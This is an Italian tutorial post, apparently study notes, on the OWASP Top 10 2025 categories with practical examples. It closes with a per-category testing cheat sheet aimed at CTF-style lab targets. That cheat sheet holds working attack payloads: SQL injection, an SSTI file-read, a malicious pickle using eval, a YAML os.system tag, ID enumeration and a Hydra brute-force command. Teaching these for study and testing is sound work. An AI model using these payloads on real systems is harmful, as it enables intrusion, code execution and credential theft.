---
title: "OWASP Top 10"
date: 2026-08-21 8:00:00 +0200
categories: [Cyber Security 101]
tags: [owasp-top-10-2025, owasp-top-10]
description: "Le 10 categorie dell'OWASP Top 10 2025 raggruppate in IAAA Failures, Application Design Flaws e Insecure Data Handling, con esempio pratico e comando/tecnica di test per ciascuna."
toc: true
---

## Intro

**OWASP** sta per **Open Web Application Security Project** — è un'organizzazione che si occupa di sicurezza delle applicazioni web. Non produce software commerciale: produce conoscenza condivisa, gratuita e aperta su come rendere i siti/app più sicuri.

Il loro documento più famoso è l'**OWASP Top 10**: una classifica delle 10 categorie di problemi di sicurezza più comuni e pericolosi che si trovano nelle applicazioni web, basata su dati reali raccolti da migliaia di applicazioni testate in tutto il mondo. È diventata uno standard nel settore.

La lista non resta fissa: viene aggiornata periodicamente (l'ultima prima del 2025 era il 2021), perché il mondo della sicurezza cambia — nuove tecnologie portano nuovi tipi di errori, mentre alcuni problemi vecchi diventano meno comuni man mano che gli sviluppatori imparano a evitarli.

Le 10 categorie del 2025 si possono raggruppare in tre grandi aree, in base al tipo di problema a cui appartengono: **IAAA Failures** (A01, A07, A09), **Application Design Flaws** (A02, A03, A06, A10) e **Insecure Data Handling** (A04, A05, A08). Di seguito sono elencate in ordine numerico.

## Le 10 categorie

**A01 — Broken Access Control** *(IAAA Failures)*
Succede quando un'applicazione non verifica correttamente se un utente ha davvero il permesso di fare quello che sta cercando di fare. Esempio tipico: cambiando un numero nell'URL (es. da `id=5` a `id=6`), un utente riesce a vedere i dati di un altro utente senza averne l'autorizzazione.

> **Esempio pratico**: `GET /api/user/123` restituisce i dati dell'utente senza controllare chi chiede. Provando `124`, `125`... si leggono i dati di tutti gli altri utenti.

**A02 — Security Misconfiguration** *(Application Design Flaws)*
Succede quando sistemi, server o applicazioni vengono distribuiti con impostazioni predefinite non sicure, configurazioni incomplete, o servizi esposti per errore. Non sono bug nel codice, ma errori in come l'ambiente è stato impostato.

> **Esempio pratico**: l'endpoint `GET /api/user/<user_id>` si aspetta un ID numerico; passando un valore non numerico (es. `admin`) l'app non lo gestisce e restituisce un errore verboso con dettagli interni invece di un messaggio generico.

**A03 — Software Supply Chain Failures** *(Application Design Flaws)*
Categoria nuova nel 2025, che espande il precedente concetto di "componenti vulnerabili o obsoleti": riguarda i rischi legati a dipendenze compromesse, pacchetti malevoli, processi di build non sicuri — tutta la catena che porta il software da chi lo scrive a chi lo esegue.

> **Esempio pratico**: l'app importa senza verifica una libreria locale (`vulnerable_utils.py`) che nasconde una modalità debug non documentata — mandando `{"data": "debug"}` a `/api/process`, l'endpoint restituisce informazioni interne pensate solo per lo sviluppo.

**A04 — Cryptographic Failures** *(Insecure Data Handling)*
Riguarda dati sensibili non adeguatamente protetti per mancanza di cifratura, implementazione errata, o misure di sicurezza insufficienti — password salvate in chiaro, chiavi di cifratura hardcoded nel codice, algoritmi di hashing deboli o obsoleti.

> **Esempio pratico**: un documento cifrato è pubblicato in pagina, e il file JavaScript che lo gestisce (`decrypt.js`) contiene in chiaro sia la chiave AES sia la modalità usata (ECB, nota per essere debole) — bastano queste due informazioni per decifrare il contenuto senza alcun accesso privilegiato.

**A05 — Injection** *(Insecure Data Handling)*
Succede quando un'applicazione prende l'input di un utente e lo gestisce in modo scorretto, passandolo direttamente a un interprete (database, sistema operativo, altro componente) senza validarlo o isolarlo a sufficienza. La SQL Injection ne è l'esempio più noto, ma la categoria include anche altre varianti come l'iniezione di comandi di sistema.

> **Esempio pratico**: nel campo username di un form di login, `admin' OR '1'='1` trasforma la query SQL in una condizione sempre vera, bypassando il controllo password.

**A06 — Insecure Design** *(Application Design Flaws)*
Riguarda vulnerabilità che nascono già nella fase di progettazione, prima ancora che venga scritta una riga di codice — logica di business con controlli deboli, assunzioni sbagliate sul comportamento degli utenti.

> **Esempio pratico**: l'app dichiara di essere pensata solo per dispositivi mobile e nasconde funzioni nel frontend di conseguenza — ma `curl http://IP/api/users` restituisce comunque l'elenco completo degli utenti (admin incluso), e da lì `curl http://IP/api/messages/admin` espone i messaggi privati dell'account: il backend non applica nessun controllo reale, si fidava solo dell'interfaccia.

**A07 — Identification and Authentication Failures** *(IAAA Failures)*
Riguarda i problemi nel processo di login/autenticazione — password deboli permesse, mancanza di protezione contro il bruteforce, sessioni che non scadono mai, meccanismi di autenticazione facilmente aggirabili.

> **Esempio pratico**: nessun rate-limit sul login permette di bruteforzare le credenziali con Hydra; nei log dell'app si trova l'IP dell'attaccante e l'account compromesso.

**A08 — Software or Data Integrity Failures** *(Insecure Data Handling)*
Riguarda situazioni in cui l'applicazione si fida di aggiornamenti, dati o file senza verificarne davvero l'integrità/provenienza — un esempio tipico è la deserializzazione insicura, dove dati non attendibili vengono ricostruiti in oggetti eseguibili senza controlli adeguati.

> **Esempio pratico**: un file YAML caricato dall'utente viene processato con `yaml.load()` invece di `yaml.safe_load()` — un tag come `!!python/object/apply:os.system` esegue comandi arbitrari sul server.

**A09 — Security Logging and Monitoring Failures** *(IAAA Failures)*
Riguarda l'assenza (o l'insufficienza) di log e monitoraggio: se un attacco avviene ma nessuno lo registra o se ne accorge, l'organizzazione perde la possibilità di rilevarlo e rispondere in tempo.

> **Esempio pratico**: un endpoint di amministrazione non registra alcun accesso — un attaccante può usarlo ripetutamente senza lasciare traccia nei log applicativi.

**A10 — Mishandling of Exceptional Conditions** *(Application Design Flaws)*
Categoria nuova nel 2025, si concentra sulla gestione impropria degli errori — come un'applicazione si comporta quando qualcosa va storto (un input inatteso, un servizio esterno che non risponde), e se quel comportamento anomalo apre involontariamente una falla di sicurezza.

> **Esempio pratico**: inviando un valore non numerico dove l'app si aspetta un ID, l'errore non gestito rivela informazioni interne invece di restituire un semplice messaggio di richiesta non valida.

## Utilizzo

L'OWASP Top 10 non va letta come un elenco di dieci bug indipendenti, ma come tre modi diversi in cui la sicurezza di un'applicazione può fallire: nel controllo di chi può fare cosa (IAAA Failures), nelle fondamenta con cui il sistema è costruito (Application Design Flaws), o nel modo in cui i dati vengono trattati (Insecure Data Handling). Conoscere questa struttura aiuta a orientarsi rapidamente di fronte a una nuova vulnerabilità: capire a quale delle tre aree appartiene suggerisce già dove cercare la causa e che tipo di correzione servirà.



## Guida di riferimento

1. Trovo un punto dove l'app **si fida** di qualcosa (un ID, un template, un oggetto serializzato, uno User-Agent)
2. Mando un input che **rompe quella fiducia**
3. Osservo se il comportamento cambia (errore diverso, dato in più, contenuto diverso)


### A01 — Broken Access Control

Cambia l'ID/numero nell'URL o nel parametro:

```
/api/user/123 → prova 124, 1, admin
```

Regola: qualsiasi ID/numero visibile in un URL va sempre provato con altri valori.

### A02 — Security Misconfiguration

Manda un input del tipo sbagliato dove l'app si aspetta un valore preciso (es. testo dove si aspetta un numero):

```bash
curl http://IP:PORT/api/user/admin
```

Cerca nella risposta uno stack trace/errore verboso con percorsi interni.

### A03 — Software Supply Chain Failures

Prova parametri "magici" comuni su endpoint API generici:

```bash
curl -X POST http://IP:PORT/api/process -H "Content-Type: application/json" -d '{"data":"debug"}'
```

Altri valori da provare se "debug" non funziona: `test`, `admin`, `verbose`, `dev`.

### A04 — Cryptographic Failures

Cerca la chiave/algoritmo esposti in un file JS pubblico (`decrypt.js`, `crypto.js`...):

```bash
curl http://IP:PORT/static/decrypt.js
```

Se trovi chiave + modalità (es. AES-ECB) → decifra su CyberChef: `From Base64` → `AES Decrypt` (Key: UTF8, Mode: ECB).

### A05 — Injection (SSTI)

```
{{ 7*7 }}
```
Se torna `49`, sei dentro. Poi:
```
{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}
```

### A06 — Insecure Design

Cambia lo User-Agent per bypassare controlli "solo mobile":

```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" http://IP:PORT/
```

Poi prova endpoint API diretti, anche senza spoofing:

```bash
curl http://IP:PORT/api/users
curl http://IP:PORT/api/messages/admin
```

### A07 — Identification and Authentication Failures

Bruteforce con Hydra su un form di login:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### A08 — Software or Data Integrity Failures (pickle)

```python
import pickle, base64
class Malicious:
    def __reduce__(self):
        return (eval, ("open('flag.txt').read()",))
print(base64.b64encode(pickle.dumps(Malicious())).decode())
```

Copia l'output nel campo "Deserialize Object" dell'app.

### A09 — Security Logging and Monitoring Failures

Non c'è un comando specifico: guarda se un'azione (login, azione admin) genera una voce di log — se non compare nulla, è la vulnerabilità stessa.

### A10 — Mishandling of Exceptional Conditions

Manda un valore non numerico dove serve un numero, o un JSON malformato:

```bash
curl -X POST http://IP:PORT/api/process -H "Content-Type: application/json" -d 'not-json'
curl http://IP:PORT/api/user/null
```

Cerca informazioni rivelate nell'errore.

---
